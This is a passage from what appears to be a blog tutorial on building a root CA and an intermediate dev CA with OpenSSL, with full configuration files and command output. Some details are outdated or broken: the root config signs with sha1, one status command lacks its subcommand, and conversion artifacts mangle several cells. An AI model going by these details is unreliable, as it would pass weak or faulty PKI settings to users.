</code></pre></div><p>Initialize and create cert database:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
<span style="color:#24909d">cd</span> /tmp/pki
touch ca/root-ca/db/root-ca.db
touch ca/root-ca/db/root-ca.db.attr
<span style="color:#24909d">echo</span> <span style="color:#3677a9">01</span> &gt; ca/root-ca/db/root-ca.crt.srl
<span style="color:#24909d">echo</span> <span style="color:#3677a9">01</span> &gt; ca/root-ca/db/root-ca.crl.srl
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
tree /tmp/pki
</code></pre></div><pre><code>/tmp/pki
â””â”€â”€ ca
    â”œâ”€â”€ conf
    â””â”€â”€ root-ca
        â”œâ”€â”€ certs
        â”œâ”€â”€ crl
        â”œâ”€â”€ db
        â”‚Â Â  â”œâ”€â”€ root-ca.crl.srl
        â”‚Â Â  â”œâ”€â”€ root-ca.crt.srl
        â”‚Â Â  â”œâ”€â”€ root-ca.db
        â”‚Â Â  â””â”€â”€ root-ca.db.attr
        â””â”€â”€ private

7 directories, 4 files
</code></pre>
<p>In order to create the certificates I&rsquo;ll keep track of every CA using OpenSSL <strong>configuration files</strong>.</p>
<h3 id="sub-commands">Sub-commands</h3>
<p>Below there is an overview of the most used <em>subcommands</em> in openssl:</p>
<table class="equalDevide" cellpadding="0" cellspacing="0" width="100%" border="0">
  <tr>
    <th class="tg-yw4l">Subcommand</th>
    <th class="tg-yw4l">Description</th>
    <th>Details</th>
  </tr>
  <tr>
    <td class="tg-yw4l">req</td>
    <td class="tg-yw4l">PKCS#10 X.509 Certificate Signing Request (CSR) Management</td>
    <td>The req command primarily creates and processes certificate requests in PKCS#10 format. It can additionally create self signed certificates for use as root CAs for example.</td>
  </tr>
  <tr>
    <td class="tg-yw4l">ca</td>
    <td class="tg-yw4l">Certificate Authority (CA) Management</td>
    <td>It can be used to sign certificate requests in a variety of forms and generate CRLs it also maintains a text database of issued certificates and their status.</td>
  </tr>
  <tr>
    <td class="tg-yw4l">pkcs12</td>
    <td class="tg-yw4l">PKCS#12 Data Management</td>
    <td>The pkcs12 command allows PKCS#12 files (sometimes referred to as PFX files) to be created and parsed. PKCS#12 files are used by several programs including Netscape, MSIE and MS Outlook.</td>
  </tr>
  <tr>
    <td class="tg-yw4l">x509</td>
    <td class="tg-yw4l">X.509 Certificate Data Management</td>
    <td>It can be used to display certificate information, convert certificates to various forms, sign certificate requests like a "mini CA" or edit certificate trust settings.</td>
  </tr>
</table>
<h3 id="create-dorneanu-root-ca">Create dornea.nu root CA</h3>
<details>
  <summary style="background-color:#f5f5f5;border:1px solid #ccc;padding:5px;">
    blockdiag code
    
  </summary>
  <div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">blockdiag {
// Define orientation
orientation = portrait;

// Define class (list of attributes)
class emphasis [color = pink, style = dashed];
class blackline [color = black, style = dotted];
class blue [color = lightblue];
class active [color = lightgreen];
class inactive [color = lightgrey];  

Root_CA [class = active, label = &#34;dornea.nu root CA&#34;];
Signing_CA2 [label = &#34;dev.dornea.nu CA&#34;];
Signing_CA3 [class = inactive, label = &#34;vpn.dornea.nu CA&#34;];
TLS_Server_CA [label = &#34;TLS Server Cert&#34;, shape = flowchart.terminator, style = dotted];
TLS_Client_CA [label = &#34;TLS Client Cert&#34;, shape = flowchart.terminator, style = dotted];
VPN_Server_CA [class = inactive, label = &#34;VPN Server Cert&#34;, shape = flowchart.terminator, style = dotted];
VPN_Client_CA [class = inactive, label = &#34;VPN Client Cert&#34;, shape = flowchart.terminator, style = dotted];

Root_CA -&gt; Signing_CA2;
Root_CA -&gt; Signing_CA3;

Signing_CA2 -&gt; TLS_Server_CA;
Signing_CA2 -&gt; TLS_Client_CA;

Signing_CA3 -&gt; VPN_Server_CA;
Signing_CA3 -&gt; VPN_Client_CA;
}
</code></pre></div>
</details>

<p><img src="/posts/img/2015/manage-a-pki-using-openssl/output_14_0.png" alt="png"></p>
<p>The configuration file can be shown here:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">%%writefile /tmp/pki/ca/conf/root-ca.conf
<span style="color:#999;font-style:italic"># &lt;!-- collapse=True --&gt;</span>

<span style="color:#999;font-style:italic"># dornea.nu Root CA</span>
<span style="color:#999;font-style:italic"># Adapted from https://pki-tutorial.readthedocs.org/en/latest/expert/root-ca.conf.html</span>

[ default ]
ca                      = root-ca               <span style="color:#999;font-style:italic"># CA name</span>
<span style="color:#24909d">dir</span>                     = .                     <span style="color:#999;font-style:italic"># Top dir</span>
base_url                = http://pki.dornea.nu  <span style="color:#999;font-style:italic"># CA base URL</span>
aia_url                 = <span style="color:#a61717;background-color:#e3d2d2">$</span>base_url/<span style="color:#a61717;background-color:#e3d2d2">$</span>ca.cer     <span style="color:#999;font-style:italic"># CA certificate URL</span>
crl_url                 = <span style="color:#a61717;background-color:#e3d2d2">$</span>base_url/<span style="color:#a61717;background-color:#e3d2d2">$</span>ca.crl     <span style="color:#999;font-style:italic"># CRL distribution point</span>
name_opt                = multiline,-esc_msb,utf8 <span style="color:#999;font-style:italic"># Display UTF-8 characters</span>
openssl_conf            = openssl_init          <span style="color:#999;font-style:italic"># Library config section</span>

<span style="color:#999;font-style:italic"># CA certificate request</span>

[ req ]
default_bits            = <span style="color:#3677a9">4096</span>                  <span style="color:#999;font-style:italic"># RSA key size</span>
encrypt_key             = yes                   <span style="color:#999;font-style:italic"># Protect private key</span>
default_md              = sha2                  <span style="color:#999;font-style:italic"># MD to use</span>
utf8                    = yes                   <span style="color:#999;font-style:italic"># Input is UTF-8</span>
string_mask             = utf8only              <span style="color:#999;font-style:italic"># Emit UTF-8 strings</span>
prompt                  = no                    <span style="color:#999;font-style:italic"># Don&#39;t prompt for DN</span>
distinguished_name      = ca_dn                 <span style="color:#999;font-style:italic"># DN section</span>
req_extensions          = ca_reqext             <span style="color:#999;font-style:italic"># Desired extensions</span>

[ ca_dn ]
countryName             = <span style="color:#ed9d13">&#34;NU&#34;</span>
organizationName        = <span style="color:#ed9d13">&#34;dornea.nu&#34;</span>
organizationalUnitName  = <span style="color:#ed9d13">&#34;dornea.nu Root CA&#34;</span>
commonName              = <span style="color:#ed9d13">&#34;dornea.nu Root CA&#34;</span>

[ ca_reqext ]
keyUsage                = critical,keyCertSign,cRLSign
basicConstraints        = critical,CA:true
subjectKeyIdentifier    = <span style="color:#24909d">hash</span>

<span style="color:#999;font-style:italic"># CA operational settings</span>

[ ca ]
default_ca              = root_ca               <span style="color:#999;font-style:italic"># The default CA section</span>

[ root_ca ]
certificate             = <span style="color:#a61717;background-color:#e3d2d2">$</span><span style="color:#24909d">dir</span>/ca/<span style="color:#a61717;background-color:#e3d2d2">$</span>ca/<span style="color:#a61717;background-color:#e3d2d2">$</span>ca.crt       <span style="color:#999;font-style:italic"># The CA cert</span>
private_key             = <span style="color:#a61717;background-color:#e3d2d2">$</span><span style="color:#24909d">dir</span>/ca/<span style="color:#a61717;background-color:#e3d2d2">$</span>ca/private/<span style="color:#a61717;background-color:#e3d2d2">$</span>ca.key <span style="color:#999;font-style:italic"># CA private key</span>
new_certs_dir           = <span style="color:#a61717;background-color:#e3d2d2">$</span><span style="color:#24909d">dir</span>/ca/<span style="color:#a61717;background-color:#e3d2d2">$</span>ca           <span style="color:#999;font-style:italic"># Certificate archive</span>
serial                  = <span style="color:#a61717;background-color:#e3d2d2">$</span><span style="color:#24909d">dir</span>/ca/<span style="color:#a61717;background-color:#e3d2d2">$</span>ca/db/<span style="color:#a61717;background-color:#e3d2d2">$</span>ca.crt.srl <span style="color:#999;font-style:italic"># Serial number file</span>
crlnumber               = <span style="color:#a61717;background-color:#e3d2d2">$</span><span style="color:#24909d">dir</span>/ca/<span style="color:#a61717;background-color:#e3d2d2">$</span>ca/db/<span style="color:#a61717;background-color:#e3d2d2">$</span>ca.crl.srl <span style="color:#999;font-style:italic"># CRL number file</span>
database                = <span style="color:#a61717;background-color:#e3d2d2">$</span><span style="color:#24909d">dir</span>/ca/<span style="color:#a61717;background-color:#e3d2d2">$</span>ca/db/<span style="color:#a61717;background-color:#e3d2d2">$</span>ca.db <span style="color:#999;font-style:italic"># Index file</span>
unique_subject          = no                    <span style="color:#999;font-style:italic"># Require unique subject</span>
default_days            = <span style="color:#3677a9">3652</span>                  <span style="color:#999;font-style:italic"># How long to certify for</span>
default_md              = sha1                  <span style="color:#999;font-style:italic"># MD to use</span>
policy                  = match_pol             <span style="color:#999;font-style:italic"># Default naming policy</span>
email_in_dn             = no                    <span style="color:#999;font-style:italic"># Add email to cert DN</span>
preserve                = no                    <span style="color:#999;font-style:italic"># Keep passed DN ordering</span>
name_opt                = <span style="color:#a61717;background-color:#e3d2d2">$</span>name_opt             <span style="color:#999;font-style:italic"># Subject DN display options</span>
cert_opt                = ca_default            <span style="color:#999;font-style:italic"># Certificate display options</span>
copy_extensions         = none                  <span style="color:#999;font-style:italic"># Copy extensions from CSR</span>
x509_extensions         = signing_ca_ext        <span style="color:#999;font-style:italic"># Default cert extensions</span>
default_crl_days        = <span style="color:#3677a9">30</span>                    <span style="color:#999;font-style:italic"># How long before next CRL</span>
crl_extensions          = crl_ext               <span style="color:#999;font-style:italic"># CRL extensions</span>

[ match_pol ]
countryName             = match
stateOrProvinceName     = optional
localityName            = optional
organizationName        = match
organizationalUnitName  = optional
commonName              = supplied

[ any_pol ]
domainComponent         = optional
countryName             = optional
stateOrProvinceName     = optional
localityName            = optional
organizationName        = optional
organizationalUnitName  = optional
commonName              = optional
emailAddress            = optional

<span style="color:#999;font-style:italic"># Extensions</span>

[ root_ca_ext ]
keyUsage                = critical,keyCertSign,cRLSign
basicConstraints        = critical,CA:true
subjectKeyIdentifier    = <span style="color:#24909d">hash</span>
authorityKeyIdentifier  = keyid:always

[ signing_ca_ext ]
keyUsage                = critical,keyCertSign,cRLSign
basicConstraints        = critical,CA:true,pathlen:<span style="color:#3677a9">0</span>
subjectKeyIdentifier    = <span style="color:#24909d">hash</span>
authorityKeyIdentifier  = keyid:always
authorityInfoAccess     = <span style="color:#ffa500">@issuer_info</span>
crlDistributionPoints   = <span style="color:#ffa500">@crl_info</span>

[ crl_ext ]
authorityKeyIdentifier  = keyid:always
authorityInfoAccess     = <span style="color:#ffa500">@issuer_info</span>

[ issuer_info ]
caIssuers;URI<span style="color:#3677a9">.0</span>         = <span style="color:#a61717;background-color:#e3d2d2">$</span>aia_url

[ crl_info ]
URI<span style="color:#3677a9">.0</span>                   = <span style="color:#a61717;background-color:#e3d2d2">$</span>crl_url

<span style="color:#999;font-style:italic"># Policy OIDs</span>

[ openssl_init ]
oid_section             = additional_oids

[ additional_oids ]

</code></pre></div><pre><code>Writing /tmp/pki/ca/conf/root-ca.conf
</code></pre>
<p>Now let&rsquo;s create the <strong>CA request</strong>. The configuration for the creation of the <strong>CSR</strong> if found in the <em>configuration</em> file in the section <code>[req]</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash"><span style="color:#ed9d13">\\</span>( <span style="color:#24909d">cd</span> /tmp/pki
<span style="color:#ed9d13">\\</span>) openssl req -new <span style="color:#ed9d13">\
</span><span style="color:#ed9d13"></span>            -config ca/conf/root-ca.conf <span style="color:#ed9d13">\
</span><span style="color:#ed9d13"></span>            -out ca/root-ca/root-ca.csr <span style="color:#ed9d13">\
</span><span style="color:#ed9d13"></span>            -keyout ca/root-ca/private/root-ca.key
            
Generating a <span style="color:#3677a9">4096</span> bit RSA private key
.......................................++
............................++
writing new private key to <span style="color:#ed9d13">&#39;ca/root-ca/private/root-ca.key&#39;</span>
Enter PEM pass phrase:
Verifying - Enter PEM pass phrase:
-----
</code></pre></div><p>Now create the <strong>CA certificate</strong> (will be valid for 10 years):</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash"><span style="color:#ed9d13">\\</span>( <span style="color:#24909d">cd</span> /tmp/pki
<span style="color:#ed9d13">\\</span>) openssl ca -selfsign <span style="color:#ed9d13">\
</span><span style="color:#ed9d13"></span>           -config ca/conf/root-ca.conf <span style="color:#ed9d13">\
</span><span style="color:#ed9d13"></span>           -in ca/root-ca/root-ca.csr <span style="color:#ed9d13">\
</span><span style="color:#ed9d13"></span>           -out ca/root-ca/root-ca.crt <span style="color:#ed9d13">\
</span><span style="color:#ed9d13"></span>           -extensions root_ca_ext <span style="color:#ed9d13">\
</span><span style="color:#ed9d13"></span>           -days <span style="color:#3677a9">3650</span>
           
Using configuration from ca/conf/root-ca.conf
Enter pass phrase <span style="color:#6ab825;font-weight:bold">for</span> ./ca/root-ca/private/root-ca.key:
Check that the request matches the signature
Signature ok
Certificate Details:
        Serial Number: <span style="color:#3677a9">1</span> (0x1)
        Validity
            Not Before: Sep <span style="color:#3677a9">28</span> 17:37:10 <span style="color:#3677a9">2015</span> GMT
            Not After : Sep <span style="color:#3677a9">25</span> 17:37:10 <span style="color:#3677a9">2025</span> GMT
        Subject:
            <span style="color:#40ffff">countryName</span>               = NU
            <span style="color:#40ffff">organizationName</span>          = dornea.nu
            <span style="color:#40ffff">organizationalUnitName</span>    = dornea.nu Root CA
            <span style="color:#40ffff">commonName</span>                = dornea.nu Root CA
        X509v3 extensions:
            X509v3 Key Usage: critical
                Certificate Sign, CRL Sign
            X509v3 Basic Constraints: critical
                CA:TRUE
            X509v3 Subject Key Identifier: 
                72:39:A1:56:5E:9D:09:ED:8D:DE:31:9E:80:9B:C4:5D:62:3B:64:66
            X509v3 Authority Key Identifier: 
                keyid:72:39:A1:56:5E:9D:09:ED:8D:DE:31:9E:80:9B:C4:5D:62:3B:64:66

Certificate is to be certified <span style="color:#6ab825;font-weight:bold">until</span> Sep <span style="color:#3677a9">25</span> 17:37:10 <span style="color:#3677a9">2025</span> GMT (<span style="color:#3677a9">3650</span> days)
Sign the certificate? [y/n]:Y


<span style="color:#3677a9">1</span> out of <span style="color:#3677a9">1</span> certificate requests certified, commit? [y/n]y
Write out database with <span style="color:#3677a9">1</span> new entries
Data Base Updated
          
</code></pre></div><p>Now you can check the <strong>status</strong> of the previously generated certificate (serial number = <strong>1</strong>):</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">$ openssl -config ca/conf/root-ca.conf -status <span style="color:#3677a9">01</span>
Using configuration from ca/conf/root-ca.conf
<span style="color:#40ffff">01</span>=Valid (V)
</code></pre></div><h3 id="create-devdorneanu-ca">Create dev.dornea.nu CA</h3>
<details>
  <summary style="background-color:#f5f5f5;border:1px solid #ccc;padding:5px;">
    blockdiag code
    
  </summary>
  <div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">blockdiag {
// Define orientation
orientation = portrait;

// Define class (list of attributes)
class emphasis [color = pink, style = dashed];
class blackline [color = black, style = dotted];
class blue [color = lightblue];
class active [color = lightgreen];
class inactive [color = lightgrey];    

Root_CA [label = &#34;dornea.nu root CA&#34;];
Signing_CA2 [class = active, label = &#34;dev.dornea.nu CA&#34;];
Signing_CA3 [label = &#34;vpn.dornea.nu CA&#34;];
TLS_Server_CA [label = &#34;TLS Server Cert&#34;, shape = flowchart.terminator, style = dotted];
TLS_Client_CA [label = &#34;TLS Client Cert&#34;, shape = flowchart.terminator, style = dotted];
VPN_Server_CA [class = inactive, label = &#34;VPN Server Cert&#34;, shape = flowchart.terminator, style = dotted];
VPN_Client_CA [class = inactive, label = &#34;VPN Client Cert&#34;, shape = flowchart.terminator, style = dotted];

Root_CA -&gt; Signing_CA2;
Root_CA -&gt; Signing_CA3;

Signing_CA2 -&gt; TLS_Server_CA;
Signing_CA2 -&gt; TLS_Client_CA;

Signing_CA3 -&gt; VPN_Server_CA;
Signing_CA3 -&gt; VPN_Client_CA;
}
</code></pre></div>
</details>

<p><img src="/posts/img/2015/manage-a-pki-using-openssl/output_20_0.png" alt="png"></p>
<p>Create the directories:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">%%bash<span style="color:#a61717;background-color:#e3d2d2">â†”</span>

</code></pre></div><p>Initialize the database:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
<span style="color:#24909d">cd</span> /tmp/pki
touch ca/dev-ca/db/dev-ca.db
touch ca/dev-ca/db/dev-ca.db.attr
<span style="color:#24909d">echo</span> <span style="color:#3677a9">01</span> &gt; ca/dev-ca/db/dev-ca.crt.srl
<span style="color:#24909d">echo</span> <span style="color:#3677a9">01</span> &gt; ca/dev-ca/db/dev-ca.crl.srl
</code></pre></div><p>Configure the CA:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">%%writefile /tmp/pki/ca/conf/dev-ca.conf
<span style="color:#999;font-style:italic"># &lt;!-- collapse=True --&gt;</span>

<span style="color:#999;font-style:italic"># dev.dornea.nu CA</span>
<span style="color:#999;font-style:italic"># Adapated from https://pki-tutorial.readthedocs.org/en/latest/advanced/tls-ca.conf.html</span>

[ default ]
ca                      = dev-ca                <span style="color:#999;font-style:italic"># CA name</span>
<span style="color:#24909d">dir</span>                     = .                     <span style="color:#999;font-style:italic"># Top dir</span>
base_url                = http://dev.dornea.nu/ca    <span style="color:#999;font-style:italic"># CA base URL</span>
aia_url                 = <span style="color:#a61717;background-color:#e3d2d2">$</span>base_url/<span style="color:#a61717;background-color:#e3d2d2">$</span>ca.cer     <span style="color:#999;font-style:italic"># CA certificate URL</span>
crl_url                 = <span style="color:#a61717;background-color:#e3d2d2">$</span>base_url/<span style="color:#a61717;background-color:#e3d2d2">$</span>ca.crl     <span style="color:#999;font-style:italic"># CRL distribution point</span>
name_opt                = multiline,-esc_msb,utf8 <span style="color:#999;font-style:italic"># Display UTF-8 characters</span>

<span style="color:#999;font-style:italic"># CA certificate request</span>

[ req ]
default_bits            = <span style="color:#3677a9">4096</span>                  <span style="color:#999;font-style:italic"># RSA key size</span>
encrypt_key             = yes                   <span style="color:#999;font-style:italic"># Protect private key</span>
default_md              = sha2                  <span style="color:#999;font-style:italic"># MD to use</span>
utf8                    = yes                   <span style="color:#999;font-style:italic"># Input is UTF-8</span>
string_mask             = utf8only              <span style="color:#999;font-style:italic"># Emit UTF-8 strings</span>
prompt                  = no                    <span style="color:#999;font-style:italic"># Don&#39;t prompt for DN</span>
distinguished_name      = ca_dn                 <span style="color:#999;font-style:italic"># DN section</span>
req_extensions          = ca_reqext             <span style="color:#999;font-style:italic"># Desired extensions</span>

[ ca_dn ]
countryName             = <span style="color:#ed9d13">&#34;NU&#34;</span>
organizationName        = <span style="color:#ed9d13">&#34;dornea.nu&#34;</span>
organizationalUnitName  = <span style="color:#ed9d13">&#34;dornea.nu Root CA&#34;</span>
commonName              = <span style="color:#ed9d13">&#34;dev.dornea.nu CA&#34;</span>

[ ca_reqext ]
keyUsage                = critical,keyCertSign,cRLSign
basicConstraints        = critical,CA:true,pathlen:<span style="color:#3677a9">0</span>
subjectKeyIdentifier    = <span style="color:#24909d">hash</span>

<span style="color:#999;font-style:italic"># CA operational settings</span>

[ ca ]
default_ca              = dev_ca                <span style="color:#999;font-style:italic"># The default CA section</span>

[ dev_ca ]
certificate             = <span style="color:#a61717;background-color:#e3d2d2">$</span><span style="color:#24909d">dir</span>/ca/<span style="color:#a61717;background-color:#e3d2d2">$</span>ca/<span style="color:#a61717;background-color:#e3d2d2">$</span>ca.crt       <span style="color:#999;font-style:italic"># The CA cert</span>
private_key             = <span style="color:#a61717;background-color:#e3d2d2">$</span><span style="color:#24909d">dir</span>/ca/<span style="color:#a61717;background-color:#e3d2d2">$</span>ca/private/<span style="color:#a61717;background-color:#e3d2d2">$</span>ca.key <span style="color:#999;font-style:italic"># CA private key</span>
new_certs_dir           = <span style="color:#a61717;background-color:#e3d2d2">$</span><span style="color:#24909d">dir</span>/ca/<span style="color:#a61717;background-color:#e3d2d2">$</span>ca           <span style="color:#999;font-style:italic"># Certificate archive</span>
serial                  = <span style="color:#a61717;background-color:#e3d2d2">$</span><span style="color:#24909d">dir</span>/ca/<span style="color:#a61717;background-color:#e3d2d2">$</span>ca/db/<span style="color:#a61717;background-color:#e3d2d2">$</span>ca.crt.srl <span style="color:#999;font-style:italic"># Serial number file</span>
crlnumber               = <span style="color:#a61717;background-color:#e3d2d2">$</span><span style="color:#24909d">dir</span>/ca/<span style="color:#a61717;background-color:#e3d2d2">$</span>ca/db/<span style="color:#a61717;background-color:#e3d2d2">$</span>ca.crl.srl <span style="color:#999;font-style:italic"># CRL number file</span>
database                = <span style="color:#a61717;background-color:#e3d2d2">$</span><span style="color:#24909d">dir</span>/ca/<span style="color:#a61717;background-color:#e3d2d2">$</span>ca/db/<span style="color:#a61717;background-color:#e3d2d2">$</span>ca.db <span style="color:#999;font-style:italic"># Index file</span>
unique_subject          = no                    <span style="color:#999;font-style:italic"># Require unique subject</span>
default_days            = <span style="color:#3677a9">365</span>                   <span style="color:#999;font-style:italic"># How long to certify for</span>
default_md              = sha256                <span style="color:#999;font-style:italic"># MD to use</span>
policy                  = match_pol             <span style="color:#999;font-style:italic"># Default naming policy</span>
email_in_dn             = no                    <span style="color:#999;font-style:italic"># Add email to cert DN</span>
preserve                = no                    <span style="color:#999;font-style:italic"># Keep passed DN ordering</span>
name_opt                = <span style="color:#a61717;background-color:#e3d2d2">$</span>name_opt             <span style="color:#999;font-style:italic"># Subject DN display options</span>
cert_opt                = ca_default            <span style="color:#999;font-style:italic"># Certificate display options</span>
copy_extensions         = copy                  <span style="color:#999;font-style:italic"># Copy extensions from CSR</span>
x509_extensions         = server_ext            <span style="color:#999;font-style:italic"># Default cert extensions</span>
default_crl_days        = <span style="color:#3677a9">1</span>                     <span style="color:#999;font-style:italic"># How long before next CRL</span>
crl_extensions          = crl_ext               <span style="color:#999;font-style:italic"># CRL extensions</span>

[ match_pol ]
countryName             = match                 <span style="color:#999;font-style:italic"># Must match &#39;NO&#39;</span>
stateOrProvinceName     = optional              <span style="color:#999;font-style:italic"># Included if present</span>
localityName            = optional              <span style="color:#999;font-style:italic"># Included if present</span>
organizationName        = match                 <span style="color:#999;font-style:italic"># Must match &#39;Green AS&#39;</span>
organizationalUnitName  = optional              <span style="color:#999;font-style:italic"># Included if present</span>
commonName              = supplied              <span style="color:#999;font-style:italic"># Must be present</span>

[ extern_pol ]
countryName             = supplied              <span style="color:#999;font-style:italic"># Must be present</span>
stateOrProvinceName     = optional              <span style="color:#999;font-style:italic"># Included if present</span>
localityName            = optional              <span style="color:#999;font-style:italic"># Included if present</span>
organizationName        = supplied              <span style="color:#999;font-style:italic"># Must be present</span>
organizationalUnitName  = optional              <span style="color:#999;font-style:italic"># Included if present</span>
commonName              = supplied              <span style="color:#999;font-style:italic"># Must be present</span>

[ any_pol ]
domainComponent         = optional
countryName             = optional
stateOrProvinceName     = optional
localityName            = optional
organizationName        = optional
organizationalUnitName  = optional
commonName              = optional
emailAddress            = optional

<span style="color:#999;font-style:italic"># Extensions</span>

[ server_ext ]
keyUsage                = critical,digitalSignature,keyEncipherment
basicConstraints        = CA:false
extendedKeyUsage        = serverAuth,clientAuth
subjectKeyIdentifier    = <span style="color:#24909d">hash</span>
authorityKeyIdentifier  = keyid:always
authorityInfoAccess     = <span style="color:#ffa500">@issuer_info</span>
crlDistributionPoints   = <span style="color:#ffa500">@crl_info</span>

[ client_ext ]
keyUsage                = critical,digitalSignature
basicConstraints        = CA:false
extendedKeyUsage        = clientAuth
subjectKeyIdentifier    = <span style="color:#24909d">hash</span>
authorityKeyIdentifier  = keyid:always
authorityInfoAccess     = <span style="color:#ffa500">@issuer_info</span>
crlDistributionPoints   = <span style="color:#ffa500">@crl_info</span>

[ crl_ext ]
authorityKeyIdentifier  = keyid:always
authorityInfoAccess     = <span style="color:#ffa500">@issuer_info</span>

[ issuer_info ]
caIssuers;URI<span style="color:#3677a9">.0</span>         = <span style="color:#a61717;background-color:#e3d2d2">$</span>aia_url

[ crl_info ]
URI<span style="color:#3677a9">.0</span>                   = <span style="color:#a61717;background-color:#e3d2d2">$</span>crl_url

</code></pre></div><pre><code>Writing /tmp/pki/ca/conf/dev-ca.conf
</code></pre>
<p>Create <strong>CA signing request</strong> (CSR):</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash"><span style="color:#ed9d13">\\</span>( <span style="color:#24909d">cd</span> /tmp/pki
<span style="color:#ed9d13">\\</span>) openssl req -new <span style="color:#ed9d13">\
</span><span style="color:#ed9d13"></span>            -config ca/conf/dev-ca.conf <span style="color:#ed9d13">\
</span><span style="color:#ed9d13"></span>            -out ca/dev-ca/dev-ca.csr <span style="color:#ed9d13">\
</span><span style="color:#ed9d13"></span>            -keyout ca/dev-ca/private/dev-ca.key
            
Generating a <span style="color:#3677a9">4096</span> bit RSA private key
.............++
..........................................................................++
writing new private key to <span style="color:#ed9d13">&#39;ca/dev-ca/private/dev-ca.key&#39;</span>
Enter PEM pass phrase:
Verifying - Enter PEM pass phrase:
-----

</code></pre></div><p>Now we use the <strong>root CA</strong> to create the <strong>dev-ca</strong> certificate:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash"><span style="color:#ed9d13">\\</span>( <span style="color:#24909d">cd</span> /tmp/pki
<span style="color:#ed9d13">\\</span>) openssl ca -config ca/conf/root-ca.conf <span style="color:#ed9d13">\
</span><span style="color:#ed9d13"></span>           -in ca/dev-ca/dev-ca.csr <span style="color:#ed9d13">\ </span>      
           -out ca/dev-ca/dev-ca.crt <span style="color:#ed9d13">\
</span><span style="color:#ed9d13"></span>           -extensions signing_ca_ext
           
Using configuration from ca/conf/root-ca.conf
Enter pass phrase <span style="color:#6ab825;font-weight:bold">for</span> ./ca/root-ca/private/root-ca.key:
Check that the request matches the signature
Signature ok
Certificate Details:
        Serial Number: <span style="color:#3677a9">2</span> (0x2)
        Validity
            Not Before: Sep <span style="color:#3677a9">28</span> 18:13:56 <span style="color:#3677a9">2015</span> GMT
            Not After : Sep <span style="color:#3677a9">27</span> 18:13:56 <span style="color:#3677a9">2025</span> GMT
        Subject:
            <span style="color:#40ffff">countryName</span>               = NU
            <span style="color:#40ffff">organizationName</span>          = dornea.nu
            <span style="color:#40ffff">organizationalUnitName</span>    = dornea.nu Root CA
            <span style="color:#40ffff">commonName</span>                = dev.dornea.nu CA
        X509v3 extensions:
            X509v3 Key Usage: critical
                Certificate Sign, CRL Sign
            X509v3 Basic Constraints: critical
                CA:TRUE, pathlen:0
            X509v3 Subject Key Identifier: 
                1A:42:33:7A:18:93:91:5F:B1:92:AA:37:39:76:31:92:3D:A6:2C:68
            X509v3 Authority Key Identifier: 
                keyid:B1:56:7C:FB:69:C7:77:CE:6C:7D:BA:CF:C7:7D:0C:6A:24:AF:8A:A1

            Authority Information Access: 
                CA Issuers - URI:http://pki.dornea.nu/root-ca.cer

            X509v3 CRL Distribution Points: 

                Full Name:
                  URI:http://pki.dornea.nu/root-ca.crl

Certificate is to be certified <span style="color:#6ab825;font-weight:bold">until</span> Sep <span style="color:#3677a9">27</span> 18:13:56 <span style="color:#3677a9">2025</span> GMT (<span style="color:#3677a9">3652</span> days)
Sign the certificate? [y/n]:y


<span style="color:#3677a9">1</span> out of <span style="color:#3677a9">1</span> certificate requests certified, commit? [y/n]y
Write out database with <span style="color:#3677a9">1</span> new entries
Data Base Updated

</code></pre></div><h3 id="create-vpndorneanu-ca">Create vpn.dornea.nu CA</h3>
<details>
  <summary style="background-color:#f5f5f5;border:1px solid #ccc;padding:5px;">
    blockdiag code
    
  </summary>
  <div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">blockdiag {
  // Define orientation
  orientation = portrait;

  // Define class (list of attributes)
  class emphasis [color = pink, style = dashed];
  class blackline [color = black, style = dotted];
  class blue [color = lightblue];
  class active [color = lightgreen];
  class inactive [color = lightgrey]; 

  Root_CA [label = &#34;dornea.nu root CA&#34;];
  Signing_CA2 [label = &#34;dev.dornea.nu CA&#34;];
  Signing_CA3 [class = active, label = &#34;vpn.dornea.nu CA&#34;];
  TLS_Server_CA [label = &#34;TLS Server Cert&#34;, shape = flowchart.terminator, style = dotted];
  TLS_Client_CA [label = &#34;TLS Client Cert&#34;, shape = flowchart.terminator, style = dotted];
  VPN_Server_CA [class = inactive, label = &#34;VPN Server Cert&#34;, shape = flowchart.terminator, style = dotted];
  VPN_Client_CA [class = inactive, label = &#34;VPN Client Cert&#34;, shape = flowchart.terminator, style = dotted];

  Root_CA -&gt; Signing_CA2;
